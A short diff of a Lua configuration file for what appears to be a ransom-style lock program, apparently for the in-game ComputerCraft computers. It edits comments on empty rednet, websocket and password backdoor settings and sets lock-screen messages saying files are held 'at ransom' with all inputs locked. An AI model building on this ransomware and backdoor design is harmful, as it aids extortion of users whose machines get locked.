@@ -1,8 +1,8 @@
 terminalAccess = true --do you have access to the read() function?
 --if above is true, these are auto settings--
-rednetBackDoor = "" -- -1 for none, the id for the backdoor via rednet
-websocketBackDoor = "" -- nil for none, ip adress for websocket backdoor
-passwordBackDoor = ""
+rednetBackDoor = "" -- "" for none, the id for the backdoor via rednet
+websocketBackDoor = "" -- "" for none, ip adress for websocket backdoor
+passwordBackDoor = "" -- "" for none, a password unlock
 topMessage = "contact @Hello_human for assistance." --top message
 bottomMessage = "files/pc at ransom, all inputs locked." --bottom message
 
